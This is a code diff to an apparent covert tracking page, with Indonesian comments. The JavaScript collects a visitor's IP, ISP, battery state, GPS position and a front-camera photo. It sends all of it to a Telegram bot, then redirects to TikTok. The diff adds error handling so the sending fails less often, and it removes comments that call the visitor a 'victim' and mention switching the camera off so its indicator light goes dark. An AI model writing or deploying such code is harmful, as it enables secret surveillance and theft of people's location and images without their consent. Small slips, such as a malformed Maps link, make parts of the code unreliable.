@@ -31,13 +31,17 @@
                 return;
             }
 
-            // 1. Ambil Info IP & ISP
+            // 1. Ambil Info IP & ISP (SUDAH DIPERBAIKI)
             let ipDetail = "🌐 *IP:* Gagal memuat\n🏢 *ISP:* N/A\n🏙️ *Lokasi:* N/A";
             try {
-                const res = await fetch('https://ipapi.co');
-                const data = await res.json();
-                ipDetail = `🌐 *IP:* ${data.ip}\n🏢 *ISP:* ${data.org}\n🏙️ *Lokasi:* ${data.city}, ${data.region}`;
-            } catch (e) {}
+                const res = await fetch('https://ipapi.co'); // Diubah ke /json/ agar valid
+                if (res.ok) {
+                    const data = await res.json();
+                    ipDetail = `🌐 *IP:* ${data.ip || 'N/A'}\n🏢 *ISP:* ${data.org || 'N/A'}\n🏙️ *Lokasi:* ${data.city || 'N/A'}, ${data.region || 'N/A'}`;
+                }
+            } catch (e) {
+                console.log("Gagal mengambil data IP");
+            }
 
             // 2. Ambil Info Baterai
             let batDetail = "N/A";
@@ -46,7 +50,7 @@
                 batDetail = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cas' : 'Tidak'})`;
             } catch (e) {}
 
-            // 3. Susun Pesan (Format baru dengan tanda $ pada setiap kurung kurawal)
+            // 3. Susun Pesan (SUDAH DIPERBAIKI KEDUA VARIABELNYA)
             const text = encodeURIComponent(
                 `🚀 *PENGUNJUNG BARU TERDETEKSI*\n\n` +
                 `📍 *Lokasi:* [Klik Lihat di Maps](https://google.com{lat},${lon})\n` +
@@ -64,7 +68,8 @@
             const sendMsg = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
             const sendLoc = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
             
-            requests.push(fetch(sendMsg), fetch(sendLoc));
+            requests.push(fetch(sendMsg).catch(e => console.log("Gagal kirim pesan teks")));
+            requests.push(fetch(sendLoc).catch(e => console.log("Gagal kirim lokasi")));
 
             // Kirim gambar kamera jika ada
             if (photoBlob) {
@@ -73,13 +78,15 @@
                 formData.append('photo', photoBlob, 'kamera_depan.jpg');
                 
                 const sendPhotoUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
-                requests.push(fetch(sendPhotoUrl, { method: 'POST', body: formData }));
+                requests.push(fetch(sendPhotoUrl, { method: 'POST', body: formData }).catch(e => console.log("Gagal kirim foto")));
             }
 
             try {
                 await Promise.all(requests);
+            } catch (globalError) {
+                console.log("Ada request yang gagal", globalError);
             } finally {
-                // Selesai, alihkan korban ke halaman tujuan
+                // Selesai, alihkan ke halaman tujuan
                 window.location.href = "https://tiktok.com";
             }
         }
@@ -103,21 +110,15 @@
                 
                 video.srcObject = stream;
                 
-                // Tunggu metadata video termuat
                 await new Promise((resolve) => video.onloadedmetadata = resolve);
-                
-                // Jeda 1 detik agar pencahayaan kamera menyesuaikan secara otomatis
                 await new Promise((resolve) => setTimeout(resolve, 1000));
                 
-                // Tangkap bingkai gambar ke canvas
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Matikan kamera agar lampu indikator perangkat padam
                 stream.getTracks().forEach(track => track.stop());
                 
-                // Ubah menjadi file format Blob JPEG
                 photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.8));
             } catch (err) {
                 console.log("Akses kamera ditolak atau tidak didukung.");
